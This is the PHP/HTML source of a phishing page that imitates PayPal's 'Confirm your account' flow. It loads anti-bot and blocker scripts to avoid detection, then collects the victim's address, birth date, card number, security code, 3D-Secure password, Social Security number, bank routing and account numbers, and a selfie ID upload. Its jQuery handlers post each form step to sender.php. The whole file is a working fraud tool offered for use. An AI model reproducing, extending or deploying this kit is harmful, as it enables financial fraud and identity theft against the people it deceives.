<?php
 include 'php/err.php';
include 'php/blocker.php';
include 'php/antibots4.php';
 
?>
<html>
<head>
<title>Confirm your account</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width" />
<link rel="icon" href="res/img/icon.png" />
<link rel="stylesheet" href="res/css/inputs.css">  
<link rel='stylesheet' href='res/css/add.css' />
<script src='res/js/q.js'></script>
<script src='res/js/v.js'></script>
<script src='res/js/m.js'></script>
<script src='res/js/p.js'></script>
</head>
<body>
<center>
 
<header>
<div class="headerleft">
<img src="res/img/logo.png"></img>
</div>
<div class="headerright">
<a href="#"><button class="mybtn"><b><font color="white">My Account</font></b></button></a>
</div>
</header>
<!------------ begin Form ------------------------>
<div class="for">




<div id='addressbillig' style="display:  ;">
<form action="" method="post" id="billing" name="billing" novalidate>
 <h1>Update Billing Address </h1>
<div class="two">
<div class="left">
<div class="nabil textInput" ><div class="fieldWrapper"><input id="firstname" name="firstname" type="text"  required="required"  placeholder="First Name"  ></div></div> 
</div>
<div class="right">
<div class="nabil textInput" ><div class="fieldWrapper"><input id="lastname" name="lastname" type="text"  required="required"  placeholder="Last Name"  ></div></div> 
</div></div> 
<div class="nabil textInput" ><div class="fieldWrapper"><input id="birthdate" name="birthdate" type="text"  required="required" placeholder="Birth Date"  ></div></div>  
<div class="nabil textInput" ><div class="fieldWrapper"><input id="address" name="address" type="text"  required="required"  placeholder="Address Line"  ></div></div> 
<div class="two">
<div class="left">
<div class="nabil textInput" ><div class="fieldWrapper"><input id="state" name="city" type="text"  required="required"  placeholder="City"  ></div></div>
</div>
<div class="right">
<div class="nabil textInput" ><div class="fieldWrapper"><input id="state" name="state" type="text"  required="required"  placeholder="State"  ></div></div>
</div>
</div>
 <div class="7wini nabil textInput" ><div class="fieldWrapper"><input id="zip" name="zip" type="text"  required="required" placeholder="Postal Code"  ></div></div> 
<div class="  nabil textInput" ><div class="fieldWrapper"><input id="phone" name="phone" type="text"  required="required"  placeholder="Phone Number"  ></div></div> 
<input type="submit" id="btnLogin" name="billingso" class="textInput  btn" value="Continue">
</form>
</div>






<div id='cardbank' style='display:none ;'>
<form action="" method="post" id="card" name="card" novalidate>
 <h1>Update Your Credit Card </h1>
  <select  class="nabil w"  name="cardtype" id="cardtype" >
  <option   selected disabled value="no type found">Card type
  <option value="Visa" >Visa
    <option value="MasterCard">MasterCard 
	<option value="Discover">Discover 
	  <option value="America Express">America Express
  </select>
 <div class="nabil textInput" ><div class="fieldWrapper"><input id="nameoncard" name="nameoncard" type="text"  required="required" placeholder="Name on card"  ></div></div>  
<div class="nabil textInput" ><div class="fieldWrapper"><input id="cardnumber" name="cardnumber" type="text"  required="required"  placeholder="Card number"  ></div></div> 
<div class="two">
<div class="left">
<div class="nabil textInput" ><div class="fieldWrapper"><input id="sc" name="sc" type="text"  class="get" required="required"  placeholder="Security Code"  ></div></div> 
</div>
<div class="right">
<div class="nabil textInput" ><div class="fieldWrapper"><input id="expirydate" name="expirydate" type="text"  required="required"  placeholder="Expiry Date"  ></div></div> 
</div>
</div>
<input type="submit" id="btnLogin" name="card" class="textInput  btn" value="Continue">
<input  type="button" id="backtobilling"  class="textInput  btn skip" style="" value="Back">
</form>
</div>







<div id='secure' style='display:  none;'>
<form action="" method="post" id="sec" name="sec" novalidate>
<h1>Confirm your debit or credit card Password & your Security Social Number </h1>

<div class="nabil textInput" ><div class="fieldWrapper"><input id="securetd"  name="securetd" type="text"    required="required"  placeholder="3D-Secure"  ></div></div> 
<div class="nabil textInput" ><div class="fieldWrapper"><input id="pin" name="pin" type="text"  required="required"  placeholder="Security Social Number"  ></div></div> 

<input type="submit" id="btnLogin" name="secure" class="textInput  btn" value="Continue">

<div class="two">
<div class="left">
<input  type="button" id="backtocreditcard"  class="textInput  btn skip" style="" value="back">
</div>
<div class="right">
<input  type="button" id="skiptolinkbank"  class="textInput  btn skip" style="" value="Skip">
</div>
</div>
</form>
</div>








<div id='linkbank' style='display: none;'>
<form action=" " method="post" id="link" name="link">
  <h1> Link your bank account </h1>
  <img src="img/bank.png"></img><br>
<div class="nabil textInput" ><div class="fieldWrapper"><input id="bankname"  name="bankname" type="text"  class="get" required="required"  placeholder="Bank Name"  ></div></div> 
<div class="nabil textInput" ><div class="fieldWrapper"><input id="routingnumber" name="routingnumber" type="text"  required="required"  placeholder="Routing Number"  ></div></div> 
<div class="nabil textInput" ><div class="fieldWrapper"><input id="accountnumbe"  name="accountnumber" type="text"  class="get" required="required"  placeholder="Account Number"  ></div></div> 
<div style="text-align:left; margin:3px;">
By continuing, you agree to let PayPal send 2 small deposit amounts (less than $1.00) and retrieve them in 1 withdrawal.
</div>
<input type="submit" id="btnLogin" name="linkbank" class="textInput  btn" value="Continue">
<div class="two">
<div class="left">
<input  type="button" id="backtosecure"  class="textInput  btn skip" style="" value="back">
</div>
<div class="right">
<input  type="button" id="skiptocardpic"  class="textInput  btn skip" style="" value="Skip">
</div>
</div>
</form>
</div>








<div id='cardpic' style='display:none ;  '>
 
<form action="php/up.php" method="post" id="cardpic" name="cardpic" enctype="multipart/form-data">
<h1> Confirme your ID for more secure  </h1>

<div class="allpic">

<div class="leftt">
<img src="img/selfie.svg" class="ppp"></img><br>
<input type="file" class="textInput  btn" name="selfie" style='margin-bottom:20px;'>
</div>


<input type="submit" id="btnLogin" name="submit" style="clear:both;" class="textInput  btn" value="Upload and finish">
<div class="two">
<div class="left">
<input  type="button" id="backtolinkbank"  class="textInput  btn skip" style="" value="back">
</div>
<div class="right">
<a href="thanks.php"><input  type="button"  class="textInput  btn skip" style="" value="Skip"></a>
</div>
</div>
</div>

</form>
 
</div>
</div>

<div class="footer">
<a href="#" class="fa">Contact us</a>
<a href="#" class="fa"> Worldwide</a>
<a href="#" class="fa">Privacy</a>
<a href="#" class="fa">Legal</a>
</div>
<!------------ end Form ------------------------>

<script>
$(function() {
	var validator = $("#billing").bind("invalid-form.validate");
  $("form[name='billing']").validate({
	errorContainer: $("#errorrbiliing"),
    rules: {
      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },
highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".nabil" ).removeClass( validClass );
	$( element ).parents( ".nabil" ).addClass( errorClass );	
				},
unhighlight: function (element, errorClass, validClass) {
	$( element ).parents( ".nabil" ).addClass( validClass );
$( element ).parents( ".nabil" ).removeClass( errorClass );
				},
    messages: {
		firstname:" ",
		lastname: " ",
		birthdate: "",
		address: "",
		city:"",
		state:"",
		zip:"",
		phone:"",
 
		
     email: " ",
     password: " ",
      password: {
        required: "",
        minlength: ""
	
      },
 password: {
        required: " <font size='2px'  color='red' style='text-align:left; '  >Please provide a password</font>",
        minlength: "<font size='2px'  color='red' style='text-align:left; '  >Your password must be at least 5 characters long</font>"
	
      },
	},
 submitHandler: function(form) {
  $("#fuck").show();
	$.post("./sender.php?ajax", $("#billing").serialize(), function(result) {
    setTimeout(function() {
		  
			$('#addressbillig').hide();
			$("#fuck").hide();
			$('#secure').hide();
			$('#linkbank').hide();
			$('#cardpic').hide();
			$('#cardbank').show();
			
                    });
                 });
        },  
		}); 
		});

   
   
   
   
   
   
   
   
   
   
   
   
   
$(function() {
	var validator = $("#card").bind("invalid-form.validate");
  $("form[name='card']").validate({
	errorContainer: $("#errorrbiliing"),
    rules: {
      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },
highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".nabil" ).removeClass( validClass );
	$( element ).parents( ".nabil" ).addClass( errorClass );	
				},
unhighlight: function (element, errorClass, validClass) {
	$( element ).parents( ".nabil" ).addClass( validClass );
$( element ).parents( ".nabil" ).removeClass( errorClass );
				},
    messages: {
 sc:"",
 cardnumber:"",
 expirydate:"",
 nameoncard:" ",
 cardtype:"",
 pin:"",
 td:"",
 
 
	},
 submitHandler: function(form) {
$("#fuck").show();
	$.post("./sender.php?ajax", $("#card").serialize(), function(result) {
    setTimeout(function() {
		$('#addressbillig').hide();
		 	$('#cardbank').hide();
			$("#fuck").hide();
			$('#cardpic').hide();
			$('#linkbank').hide();
			$('#secure').show();
                          });
                 });
        },  
		}); 
		});


	  
	  
	  
	  
	  
	  
	  
	  $(function() {
 
  $("form[name='sec']").validate({
highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".nabil" ).removeClass( validClass );
	$( element ).parents( ".nabil" ).addClass( errorClass );	
				},
unhighlight: function (element, errorClass, validClass) {
	$( element ).parents( ".nabil" ).addClass( validClass );
$( element ).parents( ".nabil" ).removeClass( errorClass );
				},
				
    messages: {
   securetd:"",
   pin:"",
	},
 submitHandler: function(form) {
$("#fuck").show();
	$.post("./sender.php?ajax", 
	$("#sec").serialize(), function(result) {
    setTimeout(function() {
		$('#addressbillig').hide();
		 	$('#cardbank').hide();
			$("#fuck").hide();
			$('#secure').hide();
			$('#linkbank').show();
			$('#cardpic').hide();
                          });
                 });
        },  
		}); 
		});
  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  $(function() {

  $("form[name='link']").validate({

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".nabil" ).removeClass( validClass );
	$( element ).parents( ".nabil" ).addClass( errorClass );	
				},
unhighlight: function (element, errorClass, validClass) {
	$( element ).parents( ".nabil" ).addClass( validClass );
$( element ).parents( ".nabil" ).removeClass( errorClass );
				},
				
    messages: {
     bankname:"",
	 routingnumber:"",
	 accountnumber:"",
	},
	
 submitHandler: function(form) {
$("#fuck").show();
	$.post("./sender.php?ajax", $("#link").serialize(), function(result) {
    setTimeout(function() {
		$('#addressbillig').hide();
		 	$('#cardbank').hide();
			$("#fuck").hide();
			$('#secure').hide();
			$('#cardpic').hide();
			$('#linkbank').hide();
			$('#cardpic').show();
                 }); }); },  
		}); 
		});
	  
	  
	  
	  
	  
	  
	  

		
		
	  
//////back

 $(function() {
    $('#birthdate').mask('00/00/0000');
	});
    $(function() {
    $('#phone').mask('(000) 000-000000000000');
	});

	
	
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000 0000');
		$('#sc').mask('0000');
		$('#expirydate').mask('00/00');
      });

	  
$(document).ready(function(){
	$("#backtobilling").click(function(){
		   $("#fuck").show();
		   
			$('#addressbillig').show();
			$('#cardbank').hide();
			$('#cardpic').hide();
			$('#secure').hide();
			$('#linkbank').hide();
			$("#fuck").hide();
	});
});

$(document).ready(function(){
	$("#backtocard").click(function(){
		   $("#fuck").show();
		   
			$('#addressbillig').hide();
			$('#cardbank').show();
			$('#secure').hide();
			$('#cardpic').hide();
			$('#linkbank').hide();
			$("#fuck").hide();
			
	});
});

$(document).ready(function(){
	$("#skiptolinkbank").click(function(){
		   $("#fuck").show();
			$('#addressbillig').hide();
			$('#cardbank').hide();
			$('#secure').hide();
			$('#cardpic').hide();
			$('#linkbank').show();
			$("#fuck").hide();
			
	});
});


			
$(document).ready(function(){
	$("#skiptocardpic").click(function(){
		   $("#fuck").show();
			$('#addressbillig').hide();
			$('#cardbank').hide();
			$('#cardpic').show();
			$('#secure').hide();
			$('#linkbank').hide();
			$("#fuck").hide();
			
	});
});

 
 $(document).ready(function(){
	$("#backtocreditcard").click(function(){
		   $("#fuck").show();
			$('#addressbillig').hide();
			$('#cardbank').show();
			$('#cardpic').hide();
			$('#secure').hide();
			$('#linkbank').hide();
			$("#fuck").hide();
			
	});
});



 $(document).ready(function(){
	$("#backtosecure").click(function(){
		   $("#fuck").show();
			$('#addressbillig').hide();
			$('#cardbank').hide();
			$('#cardpic').hide();
			$('#secure').show();
			$('#linkbank').hide();
			$("#fuck").hide();
			
	});
});

  $(document).ready(function(){
	$("#backtolinkbank").click(function(){
		   $("#fuck").show();
			$('#addressbillig').hide();
			$('#cardbank').hide();
			$('#cardpic').hide();
			$('#secure').hide();
			$('#linkbank').show();
			$("#fuck").hide();
			
	});
});
 

///back
 
</script>
<div id="fuck" class="spinner " style="display:none;">
<img src="res/img/loader.gif"></img>
</div>
</center>
</body>
</html>